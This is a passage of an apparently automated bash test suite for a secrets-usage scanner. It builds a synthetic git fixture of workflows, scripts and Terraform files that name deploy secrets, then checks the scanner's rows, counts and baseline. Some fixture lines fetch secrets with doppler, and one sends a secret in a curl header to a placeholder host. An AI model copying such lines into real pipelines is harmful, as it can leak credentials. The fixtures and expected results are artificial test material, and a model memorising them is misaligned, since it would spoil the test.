    --scanned-list "$out.scan" ${GITQ_ISO:+--git-iso} > "$out" 2> "$out.err"
  return $?
}
# bg_scan <repo> <baseline> <out> <rcfile>  — run_full in a REAL child of this shell (RF_* knobs come from the caller's environment);
# the scanner's rc is published atomically in <rcfile> when it is done. The pid is left in BG_PID.
bg_scan() {
  rm -f "$4" "$4.tmp"
  ( run_full "$1" "$2" "$3"; printf '%s' "$?" > "$4.tmp" && mv "$4.tmp" "$4" ) > /dev/null 2>&1 &
  BG_PID=$!
}
# await_rc <pid> <rcfile>  — prints the published rc once the file exists. No `wait`: the child may already have been reaped by
# a bare `wait` elsewhere in this shell, and `wait` on a non-child prints noise. 99 when the child is gone and published nothing
# (killed), 98 after 15 minutes.
await_rc() {
  local pid="$1" f="$2" t0=$SECONDS
  while [ ! -f "$f" ]; do
    if ! kill -0 "$pid" 2>/dev/null; then
      [ -f "$f" ] && break
      printf '99'; return 0
    fi
    if [ $((SECONDS - t0)) -gt 900 ]; then printf '98'; return 0; fi
    sleep 0.1
  done
  cat "$f"
}
# row_state <out> <ROWID>  — prints ok|FAIL|MISSING for the row whose name starts with "<ROWID>:"
row_state() {
  local s
  s="$(awk -F'\t' -v id="$2" 'index($2, id ":") == 1 {print $1; exit}' "$1")"
  printf '%s' "${s:-MISSING}"
}
# row_label / row_detail <out> <ROWID>  — the label (name) and the detail of that row
row_label() { awk -F'\t' -v id="$2" 'index($2, id ":") == 1 {print $2; exit}' "$1"; }
row_detail() { awk -F'\t' -v id="$2" 'index($2, id ":") == 1 {print $3; exit}' "$1"; }
# all_ok <out>  — true when every row in <out> is ok and at least one row exists
all_ok() {
  [ -s "$1" ] && ! awk -F'\t' '$1 != "ok" {bad=1} END {exit bad ? 0 : 1}' "$1"
}
nrows() { awk 'END {print NR}' "$1"; }
has_text() { [ -n "$(awk -F'\t' -v s="$2" 'index($0, s) > 0 {print "y"; exit}' "$1")" ]; }
# roots_below_floor <errfile> "<root>:<n> ..."  — prints the roots whose scanned-file count is below its floor
roots_below_floor() {
  local spec rt fl got
  for spec in $2; do
    rt="${spec%:*}"; fl="${spec##*:}"
    got="$(awk -v r="$rt" '$1 == "TRIO_ROOT_COUNT" && $2 == r {print $3}' "$1")"
    if [ "${got:-0}" -lt "$fl" ]; then printf '%s(%s<%s) ' "$rt" "${got:-0}" "$fl"; fi
  done
}
# floors_missing_roots <errfile> "<root>:<n> ..."  — prints the scan roots the scanner reports that the floor list does not name
floors_missing_roots() {
  local rt
  for rt in $(awk '$1 == "TRIO_ROOT_COUNT" {print $2}' "$1"); do
    case " $(for s in $2; do printf '%s ' "${s%:*}"; done)" in *" $rt "*) : ;; *) printf '%s ' "$rt" ;; esac
  done
}

# The independent enumerator (E2): the documented exclusions applied with awk and test builtins, sharing no code with the
# scanner. Its lists are hand-written here on purpose: a constant that drifts in the scanner shows up as a mismatch.
ENUM_BINARY="png jpg jpeg gif ico webp avif bmp tif tiff woff woff2 ttf otf eot pdf zip gz tgz bz2 xz 7z jar class so dylib o a bin mp3 mp4 mov webm wasm pen sqlite db tsq tsr bpf"
ENUM_KBCODE="sh bash zsh py pl rb ps1 mk ts tsx js jsx mjs cjs yml yaml tf tfvars tmpl hcl toml json cfg service timer"
ENUM_KBNAMES="Makefile"
# enum_scanned <repo> <outfile>  — the sorted list of paths the scanner must have scanned. A file under a doc prefix that is
# neither a listed code extension nor a listed code basename is scanned only when it starts with a shebang.
enum_scanned() {
  local repo="$1" rel
  assert_fixture_dir "$repo"
  GITQ -C "$repo" ls-files -z --cached --others --exclude-standard | tr '\0' '\n' | LC_ALL=C sort -u \
    | awk -v repo="$repo" -v suite="$SUITE_REL" -v bl="$BASELINE_REL" -v bins="$ENUM_BINARY" -v codes="$ENUM_KBCODE" -v names="$ENUM_KBNAMES" '
        BEGIN { n = split(bins, b, " "); for (i = 1; i <= n; i++) bin[b[i]] = 1; n = split(codes, c, " "); for (i = 1; i <= n; i++) code[c[i]] = 1
                n = split(names, m, " "); for (i = 1; i <= n; i++) nm[m[i]] = 1 }
        { rel = $0; if (rel == suite || rel == bl) next
          base = rel; sub(/^.*\//, "", base); ext = ""
          if (index(base, ".") > 0) { ext = base; sub(/^.*\./, "", ext); ext = tolower(ext) }
          if (ext in bin) next
          if ((rel ~ /^knowledge-base\// || rel ~ /^docs\//) && !(ext in code) && !(base in nm)) {
            f = repo "/" rel; first = ""; got = (getline first < f); close(f)
            if (got > 0 && substr(first, 1, 2) == "#!") print rel
            next }
          print rel }' \
    | while IFS= read -r rel; do
        if [ -L "$repo/$rel" ] || [ ! -f "$repo/$rel" ]; then continue; fi
        printf '%s\n' "$rel"
      done
}
# cons_diff <repo> <scanner list (NUL separated)>  — empty when the scanner's population equals the independent enumeration
cons_diff() {
  local repo="$1"
  assert_fixture_dir "$repo"
  diff <(enum_scanned "$repo") <(tr '\0' '\n' < "$2" | LC_ALL=C sort -u)
}
# dirs_unscanned <repo> <scanner list> "<allow dirs>"  — second-level dirs of apps/web-platform and plugins/soleur that hold
# a tracked file and no scanned file (and are not on the named allow-list)
dirs_unscanned() {
  local repo="$1" allow="$3" dd
  assert_fixture_dir "$repo"
  while IFS= read -r dd; do
    case " $allow " in *" $dd "*) continue ;; esac
    printf '%s ' "$dd"
  done < <(
    LC_ALL=C comm -23 \
      <(GITQ -C "$repo" ls-files -z --cached --others --exclude-standard | tr '\0' '\n' | awk -F/ '($1 == "apps" && $2 == "web-platform" || $1 == "plugins" && $2 == "soleur") && NF > 3 {print $1 "/" $2 "/" $3}' | LC_ALL=C sort -u) \
      <(tr '\0' '\n' < "$2" | awk -F/ '($1 == "apps" && $2 == "web-platform" || $1 == "plugins" && $2 == "soleur") && NF > 3 {print $1 "/" $2 "/" $3}' | LC_ALL=C sort -u)
  )
}

# ── A. the live tree ─────────────────────────────────────────────────────────────────────
assert_fixture_dir "$REPODIR"
_live_ref="${TRIO_BASE_REF:-refs/remotes/origin/main}"
_live_sib="$REPODIR/$SIBLING_REL"
[ -f "$_live_sib" ] || _live_sib="$ROOT/$SIBLING_REL"
LIVE_ROOT_FLOORS=".github/workflows:81 .github/actions:12 .github/scripts:26 scripts:756 plugins:1515 apps/web-platform:2990"
NOSCAN_DIRS=""
RF_REF="$_live_ref" RF_TODAY="$TODAY" RF_EVENT="${GITHUB_EVENT_NAME:-}" RF_EVENTREF="${GITHUB_REF:-}" RF_ENVS="" RF_SIB="$_live_sib" RF_PY="" \
  bg_scan "$REPODIR" "$BASELINE" "$T/live.tsv" "$T/live.rc"
LIVE_PID=$BG_PID
# eval_live: judge the live-tree scan that was started in the background at the top of section A
eval_live() {
  _live_rc="$(await_rc "$LIVE_PID" "$T/live.rc")"
  cat "$T/live.tsv.bd.err" >&2 2>/dev/null
  printf 'TRIO_BASE_ARM=%s ref=%s status=%s\n' "$(cat "$T/live.tsv.bd/arm" 2>/dev/null)" "$(tr -d '[:cntrl:]' < "$T/live.tsv.bd/ref" 2>/dev/null)" "$(cat "$T/live.tsv.bd/status" 2>/dev/null)" >&2
  cat "$T/live.tsv.ann" 2>/dev/null
  cat "$T/live.tsv.err" >&2 2>/dev/null
  if [ "$_live_rc" -eq 3 ]; then
    printf 'FAIL SETUP: the scanner could not assemble its population: %s\n' "$(head -c 300 "$T/live.tsv.err")" >&2
    exit 1
  fi
  if [ "$_live_rc" -ne 0 ]; then
    fail "A0: the scanner ran on the live tree" "rc=$_live_rc: $(head -c 300 "$T/live.tsv.err")"
  else
    pass "A0: the scanner ran on the live tree"
  fi
  while IFS=$'\t' read -r _rs _nm _dt; do
    [ -n "${_rs:-}" ] || continue
    if [ "$_rs" = "ok" ]; then pass "live $_nm"; else fail "live $_nm" "$_dt"; fi
  done < "$T/live.tsv"
  _nlive="$(nrows "$T/live.tsv")"
  if [ "$_nlive" -eq "$NROWS" ]; then pass "A1: the live run produced all $NROWS rows ($_nlive)"; else fail "A1: the live run produced all $NROWS rows" "got $_nlive"; fi
  # A2: per-root floors (F-A1), each within ~10% of the measured count at the time they were set.
  _below="$(roots_below_floor "$T/live.tsv.err" "$LIVE_ROOT_FLOORS")"
  if [ -z "$_below" ]; then pass "A2: every scan root meets its minimum file floor ($LIVE_ROOT_FLOORS)"; else fail "A2: every scan root meets its minimum file floor" "below: $_below"; fi
  _missing_floor="$(floors_missing_roots "$T/live.tsv.err" "$LIVE_ROOT_FLOORS")"
  if [ -z "$_missing_floor" ]; then pass "A2b: the floor list names every scan root the scanner reports"; else fail "A2b: the floor list names every scan root the scanner reports" "no floor for: $_missing_floor"; fi
  # A3/A4 (E2): conservation against the independent enumerator, and no second-level directory silently unscanned.
  _cons="$(cons_diff "$REPODIR" "$T/live.tsv.scan" | head -c 400)"
  if [ -z "$_cons" ]; then pass "A3: the scanner's population equals the independent bash enumeration of git ls-files under the documented exclusions"; else fail "A3: the scanner's population equals the independent bash enumeration" "$_cons"; fi
  _unscanned="$(dirs_unscanned "$REPODIR" "$T/live.tsv.scan" "$NOSCAN_DIRS")"
  if [ -z "$_unscanned" ]; then pass "A4: every second-level directory of apps/web-platform and plugins/soleur holding a tracked file has a scanned file (or is on the named list: $NOSCAN_DIRS)"; else fail "A4: every second-level directory of apps/web-platform and plugins/soleur has a scanned file" "unscanned: $_unscanned"; fi
  # A5 (F1): the affected-gate edge declares every top-level entry, and the knowledge-base code extensions.
  _edge="$(bash -c 'source "$1" && printf "%s\n" "${'"$AFFECTED_ARRAY"'[@]}"' _ "$REPODIR/$LIB_REL" 2>/dev/null)"
  _edge_miss=""
  while IFS= read -r _top; do
    [ -n "$_top" ] || continue
    if [ -d "$REPODIR/$_top" ]; then
      if [ "$_top" = "knowledge-base" ]; then
        for _x in $ENUM_KBCODE; do grep -qxF "glob:$KBN/**.$_x" <<<"$_edge" || _edge_miss="$_edge_miss glob:$KBN/**.$_x"; done
        for _x in $ENUM_KBNAMES; do grep -qxF "glob:$KBN/**$_x" <<<"$_edge" || _edge_miss="$_edge_miss glob:$KBN/**$_x"; done
      else grep -qxF "$_top/" <<<"$_edge" || _edge_miss="$_edge_miss $_top/"; fi
    else grep -qxF "$_top" <<<"$_edge" || _edge_miss="$_edge_miss $_top"; fi
  done < <(GITQ -C "$REPODIR" ls-files -z | tr '\0' '\n' | awk -F/ '{print $1}' | LC_ALL=C sort -u)
  grep -qxF "$ADR_REL" <<<"$_edge" || _edge_miss="$_edge_miss $ADR_REL"
  if [ -n "$_edge" ] && [ -z "$_edge_miss" ]; then pass "A5: $AFFECTED_ARRAY declares every tracked top-level entry, the knowledge-base code globs and ADR-241 (a new top-level entry needs a line)"
  else fail "A5: $AFFECTED_ARRAY declares every tracked top-level entry, the knowledge-base code globs and ADR-241" "missing:$_edge_miss"; fi
}

# ── B. the synthetic fixture (a git repo: the smallest fully compliant tree, with a base history) ─
FX="$T/fx"
assert_fixture_dir "$FX"
mkdir -p "$FX/.github/workflows" "$FX/.github/actions/keep" "$FX/.github/actions/uses-trio" "$FX/.github/scripts" "$FX/scripts/followthroughs" \
  "$FX/apps/web-platform/infra" "$FX/apps/web-platform/server" "$FX/apps/web-platform/test" "$FX/apps/web-platform/app" "$FX/plugins/soleur/skills/ship" \
  "$FX/plugins/soleur/agents" "$FX/tests/scripts" "$FX/knowledge-base/engineering/architecture/decisions" "$FX/$KBN/project" "$FX/docs" \
  || { printf 'FAIL SETUP: mkdir fixture\n' >&2; exit 1; }
cat > "$FX/.github/workflows/web-platform-release.yml" <<'EOF'
name: rel
jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - run: echo "deploy"
        env:
          WEBHOOK_DEPLOY_SECRET: ${{ secrets.WEBHOOK_DEPLOY_SECRET }}
EOF
cat > "$FX/.github/workflows/canary-status.yml" <<'EOF'
name: canary
jobs:
  probe:
    runs-on: ubuntu-latest
    steps:
      - run: |
          id="$(doppler secrets get CF_ACCESS_CLIENT_ID --plain -c prd_terraform)"
EOF
cat > "$FX/.github/workflows/cutover-inngest.yml" <<'EOF'
name: cutover
jobs:
  c:
    runs-on: ubuntu-latest
    env:
      S: ${{ secrets.CF_ACCESS_CLIENT_SECRET }}
    steps:
      - run: echo c
EOF
cat > "$FX/.github/workflows/deploy-chan.yml" <<'EOF'
name: dc
jobs:
  deploy:
    runs-on: ubuntu-latest
    environment: deploy-channel
    steps:
      - run: |
          curl -H "X-Sig: $WEBHOOK_DEPLOY_SECRET" https://example.invalid
EOF
# non-canonical on purpose: 4-space indent, odd step keys, mapping and quoted environment forms, two jobs
cat > "$FX/.github/workflows/deploy-chan2.yml" <<'EOF'
name:   dc2
jobs:
    one:
        runs-on: x
        environment:
            name: "deploy-channel"
        steps:
            - name: whatever differently named
              run: |
                  echo "${CF_ACCESS_CLIENT_ID}"
    two:
        environment: 'infra-privileged'
        runs-on: x
        steps:
            - uses: foo/bar@v1
              with:
                  token: ${{ env.CF_ACCESS_CLIENT_ID }}
EOF
cat > "$FX/.github/workflows/migrate.yml" <<'EOF'
name: migrate
jobs:
  m:
    runs-on: ubuntu-latest
    steps:
      - run: echo "$X"
        env:
          X: ${{ secrets.CF_ACCESS_CLIENT_ID }}
EOF
printf 'name: keep\nruns:\n  using: composite\n  steps: []\n' > "$FX/.github/actions/keep/action.yml"
cat > "$FX/.github/actions/uses-trio/action.yml" <<'EOF'
name: uses-trio
runs:
  using: composite
  steps:
    - shell: bash
      run: echo hi
      env:
        CF_ACCESS_CLIENT_ID: ${{ inputs.cf_id }}
EOF
printf '#!/usr/bin/env bash\necho clean\n' > "$FX/.github/scripts/clean.sh"
cat > "$FX/scripts/probe.sh" <<'EOF'
#!/usr/bin/env bash
# a comment that names CF_ACCESS_CLIENT_SECRET must not create a row
id="$(doppler secrets get CF_ACCESS_CLIENT_ID --plain \
  || doppler secrets get CI_SSH_ACCESS_TOKEN_ID --plain)"
EOF
printf '#!/usr/bin/env bash\ndoppler secrets get WEBHOOK_DEPLOY_SECRET --plain\n' > "$FX/scripts/followthroughs/soak.sh"
printf '#!/usr/bin/env bash\nexport H="$HCLOUD_TOKEN"\necho "using ${WEBHOOK_DEPLOY_SECRET}"\n' > "$FX/scripts/host-user.sh"
# a rename-calibration file: one naming line plus 99 filler comment lines (the -M90% boundary fixtures edit k of them)
{ printf '#!/usr/bin/env bash\necho "$WEBHOOK_DEPLOY_SECRET"\n'; for _i in $(seq 1 99); do printf '# filler line number %03d: the quick brown fox jumps over the lazy dog\n' "$_i"; done; } > "$FX/scripts/ren.sh"
# binaries by extension: NUL bytes, no names. One more binary-looking file without a binary extension is NOT here (it is a mutant).
printf '\211PNG\r\n\032\n\0\0\0\rIHDR\0\0\0' > "$FX/scripts/blob.png"
printf 'wOF2\0\0\0\0\0\0\0\0' > "$FX/plugins/soleur/skills/ship/font.woff2"
ln -s probe.sh "$FX/scripts/link.sh"
cat > "$FX/apps/web-platform/infra/server.tf" <<'EOF'
locals {
  hooks_json = templatefile("${path.module}/hooks.json.tmpl", {
    webhook_deploy_secret = var.webhook_deploy_secret
  })
}
resource "terraform_data" "deploy_pipeline_fix" {
  triggers_replace = sha256(join(",", [file("${path.module}/a.sh"), local.hooks_json]))
}
EOF
printf 'variable "webhook_deploy_secret" {\n  type      = string\n  sensitive = true\n}\n' > "$FX/apps/web-platform/infra/variables.tf"
printf '{"secret": ${jsonencode(webhook_deploy_secret)}}\n' > "$FX/apps/web-platform/infra/hooks.json.tmpl"
cat > "$FX/apps/web-platform/infra/tunnel.tf" <<'EOF'
output "access_service_token_client_secret" {
  value     = cloudflare_zero_trust_access_service_token.deploy.client_secret
  sensitive = true
}
output "access_service_token_client_id" {
  value = cloudflare_zero_trust_access_service_token.deploy.client_id
}
output "ci_ssh_access_service_token_client_id" {
  value = cloudflare_zero_trust_access_service_token.ci_ssh.client_id
}
EOF
printf 'export const clean = 1;\n' > "$FX/apps/web-platform/server/clean.ts"
printf '// CF_ACCESS_CLIENT_ID in a slash comment must not create a row\nexport const c = 2;\n' > "$FX/apps/web-platform/server/c.ts"
printf 'export default function Page() { return null; }\n' > "$FX/apps/web-platform/app/page.tsx"
printf 'agent notes\n' > "$FX/plugins/soleur/agents/a.md"
printf 'const n = "CF_ACCESS_CLIENT_SECRET";\n' > "$FX/apps/web-platform/test/y.ts"
mkdir -p "$FX/apps/web-platform/fixtures" "$FX/plugins/soleur/skills/__tests__"
printf '{"n": "WEBHOOK_DEPLOY_SECRET"}\n' > "$FX/apps/web-platform/fixtures/f.json"
printf 'export const n = "CF_ACCESS_CLIENT_ID";\n' > "$FX/plugins/soleur/skills/__tests__/z.ts"
printf 'it("x", () => { expect("WEBHOOK_DEPLOY_SECRET").toBe(1) });\n' > "$FX/apps/web-platform/server/a.spec.ts"
printf 'run "x" {\n  variables = { n = "CF_ACCESS_CLIENT_SECRET" }\n}\n' > "$FX/apps/web-platform/infra/m.tftest.hcl"
cat > "$FX/plugins/soleur/skills/ship/SKILL.md" <<'EOF'
# Deploy with CF_ACCESS_CLIENT_ID

```bash
doppler secrets get WEBHOOK_DEPLOY_SECRET -c prd_terraform --plain
```
EOF
printf '#!/usr/bin/env bash\n# mentions WEBHOOK_DEPLOY_SECRET and CF_ACCESS_CLIENT_ID only\necho "$WEBHOOK_DEPLOY_SECRET"\n' > "$FX/tests/x.test.sh"
printf '#!/usr/bin/env bash\n# no trio name here: a doppler call alone is not a read of the trio\ndoppler secrets get SENTRY_DSN --plain\n' > "$FX/tests/y.test.sh"
printf 'secrets.WEBHOOK_DEPLOY_SECRET in a kb note\n' > "$FX/knowledge-base/kb.md"
printf '#!/usr/bin/env bash\necho clean kb script\n' > "$FX/knowledge-base/project/boot.sh"
printf 'secrets.CF_ACCESS_CLIENT_ID in a doc\n' > "$FX/docs/d.md"
printf '#!/usr/bin/env bash\necho clean extensionless script under docs\n' > "$FX/docs/runme"
printf 'plain notes with no shebang\n' > "$FX/docs/notes"
mkdir -p "$FX/docs/ext"
for _e in sh bash zsh py pl rb ps1 mk ts tsx js jsx mjs cjs yml yaml tf tfvars tmpl hcl toml json cfg service timer; do printf 'echo clean\n' > "$FX/docs/ext/clean.$_e"; done
printf 'all:\n\t@echo clean\n' > "$FX/$KBN/project/Makefile"
printf '<svg>secrets.CF_ACCESS_CLIENT_ID</svg>\n' > "$FX/docs/pic.svg"
printf 'ADR-241 fixture\n' > "$FX/$ADR_REL"
{ GITQ_ISO=1 GITQ init -q -b fxmain "$FX" && gc -C "$FX" add -A && gc -C "$FX" commit -q -m c0; } || { printf 'FAIL SETUP: fixture git init\n' >&2; exit 1; }
gc -C "$FX" update-ref refs/remotes/origin/pre HEAD
printf '#!/usr/bin/env bash\n# the suite placeholder: secrets.CF_ACCESS_CLIENT_ID\n' > "$FX/$SUITE_REL"
gc -C "$FX" add -A && gc -C "$FX" commit -q -m c0b && gc -C "$FX" update-ref refs/remotes/origin/nobl HEAD
TAB=$'\t'
py3 "$T/trio.py" --repo "$FX" --baseline "$T/empty.tsv" --today "$FIXTODAY" --mode emit --envs "$FIXENVS" --git-iso 2>/dev/null | awk '/^@(stems|exempt|binary|kbcode) /' > "$T/fx-pins.txt"
{
  printf '# fixture baseline\n'
  cat "$T/fx-pins.txt"
  cat <<EOF
@allow${TAB}apps/web-platform/infra/cloud-init.yml${TAB}WEBHOOK_DEPLOY_SECRET_NEXT${TAB}-${TAB}#9294:PR-2
@allow${TAB}apps/web-platform/infra/hooks.json.tmpl${TAB}WEBHOOK_DEPLOY_SECRET_NEXT${TAB}-${TAB}#9294:PR-2
@allow${TAB}apps/web-platform/infra/server.tf${TAB}WEBHOOK_DEPLOY_SECRET_NEXT${TAB}-${TAB}#9294:PR-2
@allow${TAB}apps/web-platform/infra/soleur-host-bootstrap.sh${TAB}WEBHOOK_DEPLOY_SECRET_NEXT${TAB}2026-11-30${TAB}#9294:PR-2
@allow${TAB}apps/web-platform/infra/variables.tf${TAB}WEBHOOK_DEPLOY_SECRET_NEXT${TAB}-${TAB}#9294:PR-2
@allow${TAB}scripts/gated-a.sh${TAB}CF_ACCESS_CLIENT_SECRET${TAB}2026-11-30${TAB}#9294:PR-2
@allow${TAB}scripts/gated-b.sh${TAB}CF_ACCESS_CLIENT_ID${TAB}-${TAB}#9294:PR-2
.github/actions/uses-trio/action.yml${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
.github/workflows/canary-status.yml${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-3
.github/workflows/cutover-inngest.yml${TAB}CF_ACCESS_CLIENT_SECRET${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-4
.github/workflows/deploy-chan.yml${TAB}WEBHOOK_DEPLOY_SECRET${TAB}tier-b${TAB}-${TAB}#9294:PR-2
.github/workflows/deploy-chan2.yml${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-b${TAB}-${TAB}#9294:PR-2
.github/workflows/migrate.yml${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
.github/workflows/web-platform-release.yml${TAB}WEBHOOK_DEPLOY_SECRET${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-3
apps/web-platform/infra/hooks.json.tmpl${TAB}WEBHOOK_DEPLOY_SECRET${TAB}sink${TAB}-${TAB}#9294:PR-2
apps/web-platform/infra/server.tf${TAB}WEBHOOK_DEPLOY_SECRET${TAB}sink${TAB}-${TAB}#9294:PR-2
apps/web-platform/infra/tunnel.tf${TAB}ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
apps/web-platform/infra/tunnel.tf${TAB}ALIAS:ACCESS_SERVICE_TOKEN_CLIENT_SECRET${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
apps/web-platform/infra/variables.tf${TAB}WEBHOOK_DEPLOY_SECRET${TAB}sink${TAB}-${TAB}#9294:PR-2
plugins/soleur/skills/ship/SKILL.md${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
plugins/soleur/skills/ship/SKILL.md${TAB}WEBHOOK_DEPLOY_SECRET${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
scripts/followthroughs/soak.sh${TAB}WEBHOOK_DEPLOY_SECRET${TAB}tier-a${TAB}2026-12-15${TAB}#9294:PR-4
scripts/host-user.sh${TAB}WEBHOOK_DEPLOY_SECRET${TAB}sink${TAB}-${TAB}#9294:PR-2
scripts/probe.sh${TAB}CF_ACCESS_CLIENT_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
scripts/probe.sh${TAB}FALLBACK:CI_SSH_ACCESS_TOKEN_ID${TAB}tier-a${TAB}2026-11-30${TAB}#9294:PR-2
scripts/ren.sh${TAB}WEBHOOK_DEPLOY_SECRET${TAB}sink${TAB}-${TAB}#9294:PR-2
EOF
} > "$T/fx-baseline.tsv"
cp "$T/fx-baseline.tsv" "$FX/$BASELINE_REL"
gc -C "$FX" add -A && gc -C "$FX" commit -q -m c1 && gc -C "$FX" update-ref refs/remotes/origin/main HEAD
gc -C "$FX" commit -q --allow-empty -m head && gc -C "$FX" update-ref refs/remotes/origin/head HEAD
FXHEAD="$(GITQ -C "$FX" rev-parse HEAD)"
FX_TIER_A_ROWS="$(awk -F'\t' '$3 == "tier-a" {n++} END {print n + 0}' "$T/fx-baseline.tsv")"

(GITQ_ISO=1 run_full "$FX" "$FX/$BASELINE_REL" "$T/ctl.tsv")
if all_ok "$T/ctl.tsv" && [ "$(nrows "$T/ctl.tsv")" -eq "$NROWS" ]; then pass "B0: the control run on the compliant fixture is all green with $NROWS rows (a red control voids every mutant)"
else fail "B0: the control run on the compliant fixture is all green with $NROWS rows" "$(grep -v '^ok' "$T/ctl.tsv" | head -c 600) $(head -c 200 "$T/ctl.tsv.err")"; fi
if [ "$(cat "$T/ctl.tsv.bd/arm" 2>/dev/null)" = "merge-base" ]; then pass "B0a: the control resolved its base through the merge-base arm (TRIO_BASE_ARM=merge-base)"
else fail "B0a: the control resolved its base through the merge-base arm" "arm=$(cat "$T/ctl.tsv.bd/arm" 2>/dev/null) status=$(cat "$T/ctl.tsv.bd/status" 2>/dev/null)"; fi
# B1: the baseline is derived, and the fixture's classes/expiries are what the hand-written list says (not a tautology: the list is the input;
# soak.sh carries a re-dated expiry that emit must PRESERVE, and the unspent @allow lines must survive).
py3 "$T/trio.py" --repo "$FX" --baseline "$FX/$BASELINE_REL" --today "$FIXTODAY" --mode emit --envs "$FIXENVS" --git-iso > "$T/emit.tsv" 2> "$T/emit.err"
if diff <(grep -v '^#' "$T/fx-baseline.tsv") "$T/emit.tsv" > "$T/emit.diff"; then pass "B1: --emit-baseline on the fixture reproduces the hand-written records (class, tag, a re-dated expiry, pins, @allow) exactly"
else fail "B1: --emit-baseline on the fixture reproduces the hand-written records exactly" "$(head -c 500 "$T/emit.diff")"; fi
# B2: population facts of the control (exempt by structure, binary by extension, symlink, excluded prefix/own, read-shape files)
if grep -qx 'TRIO_EXEMPT=7' "$T/ctl.tsv.err" && grep -qx 'TRIO_BINARY=2' "$T/ctl.tsv.err" && grep -qx 'TRIO_SYMLINKS=1' "$T/ctl.tsv.err" && grep -qx 'TRIO_EXCLUDED=7' "$T/ctl.tsv.err" && grep -qx 'TRIO_READSHAPE_HITS=7' "$T/ctl.tsv.err"; then
  pass "B2: the fixture population reports its exempt, binary-extension, symlink, excluded and read-shape counts on stderr (7 exempt, 2 binary, 1 symlink, 7 excluded, 7 read-shape files)"
else fail "B2: the fixture population reports its exempt/binary/symlink/excluded/read-shape counts" "$(tr '\n' ' ' < "$T/ctl.tsv.err" | head -c 400)"; fi
# B3: the independent enumerator and the scanner agree on the fixture too, and no second-level directory is unscanned
_c="$(cons_diff "$FX" "$T/ctl.tsv.scan" | head -c 300)"
_u="$(dirs_unscanned "$FX" "$T/ctl.tsv.scan" "")"
if [ -z "$_c" ] && [ -z "$_u" ]; then pass "B3: on the fixture the scanner population equals the independent enumeration and every second-level directory has a scanned file"
else fail "B3: on the fixture the scanner population equals the independent enumeration" "diff: $_c unscanned: $_u"; fi

# Mutation machinery ----------------------------------------------------------------------------
# prep <id>  — fresh git-init'd copy of the PRISTINE fixture at $D/fx; sets D (PREP_BASE overrides the parent directory)
PREP_BASE="$T/mut"
prep() {
  D="$PREP_BASE/$1"
  assert_fixture_dir "$D"
  rm -rf "$D"; mkdir -p "$D" || { printf 'FAIL SETUP: mkdir %s\n' "$D" >&2; exit 1; }
  cp -a "$FX" "$D/fx" || { printf 'FAIL SETUP: copy fixture for %s\n' "$1" >&2; exit 1; }
  BL="$D/fx/$BASELINE_REL"
}
# commit_all  — commit the copy's current state on its branch (a PR commit on top of the base)
commit_all() { gc -C "$D/fx" add -A && gc -C "$D/fx" commit -q -m "mut" ; }
# edit <file> <old> <new>  — exact-once replacement (exit 1 when <old> is not unique: the edit then did not land)
edit() {
  py3 - "$1" "$2" "$3" <<'PYE'
import sys
p, old, new = sys.argv[1:4]
s = open(p, encoding="utf-8").read()
if s.count(old) != 1:
    sys.exit(1)
open(p, "w", encoding="utf-8").write(s.replace(old, new))
PYE
}
# bl_set <file> <name> <colno> <value>  — rewrite one column of one baseline row
bl_set() {
  awk -F'\t' -v OFS='\t' -v f="$1" -v n="$2" -v c="$3" -v val="$4" '$1 == f && $2 == n {$c = val} {print}' "$BL" > "$BL.new" && mv "$BL.new" "$BL"
}
bl_add() { printf '%s\t%s\t%s\t%s\t%s\n' "$1" "$2" "$3" "$4" "$5" >> "$BL"; }
bl_del() { awk -F'\t' -v f="$1" -v n="$2" '!($1 == f && $2 == n)' "$BL" > "$BL.new" && mv "$BL.new" "$BL"; }
# bl_allow_del <file> <name>  — delete one @allow line
bl_allow_del() { awk -F'\t' -v f="$1" -v n="$2" '!($1 == "@allow" && $2 == f && $3 == n)' "$BL" > "$BL.new" && mv "$BL.new" "$BL"; }
# bl_regen  — replace the copy's baseline with the scanner's own --emit-baseline output (what the documented regeneration produces)
bl_regen() {
  GITQ_ISO=1 py3 "$T/trio.py" --repo "$D/fx" --baseline "$BL" --today "$FIXTODAY" --mode emit --envs "$FIXENVS" --git-iso > "$BL.new" 2> /dev/null && mv "$BL.new" "$BL"
}
# adr_add <text>  — append a line to the copy's ADR-241
adr_add() { printf '%s\n' "$1" >> "$D/fx/$ADR_REL"; }
# landed_dir  — "landed" when the copy's tree, history or scanner differs from the pristine fixture
landed_dir() {
  local ch=0
  diff -r -q --exclude=.git "$FX" "$D/fx" >/dev/null 2>&1 || ch=1
  if [ -f "$D/trio.py" ] && ! cmp -s "$T/trio.py" "$D/trio.py"; then ch=1; fi
  if [ "$(GITQ -C "$D/fx" rev-parse HEAD)" != "$FXHEAD" ]; then ch=1; fi
  if [ "$ch" -eq 1 ]; then printf 'landed' > "$D/landed"; else printf 'unchanged' > "$D/landed"; fi
}
# knobs NAME=VALUE...  — shell assignments for run_full (RF_*, TRIO_*, BLPATH), written %q-quoted so no value can inject
# a fragment; a leading `+` exports the variable (PATH for the git shim)
knobs() {
  local a
  : > "$D/menv"
  for a in "$@"; do
    case "$a" in
      +*) a="${a#+}"; printf 'export %s=%q\n' "${a%%=*}" "${a#*=}" >> "$D/menv" ;;
      *)  printf '%s=%q\n' "${a%%=*}" "${a#*=}" >> "$D/menv" ;;
    esac
  done
}
# run_in <dir>  — run the scanner on <dir>/fx honouring <dir>/menv; output <dir>/out, rc <dir>/rc
run_in() {
  local d="$1"
  assert_fixture_dir "$d"
  (
    unset TRIO_ALLOW_NO_BASE
    export GITQ_ISO=1
    # shellcheck disable=SC1091
    if [ -f "$d/menv" ]; then . "$d/menv"; fi
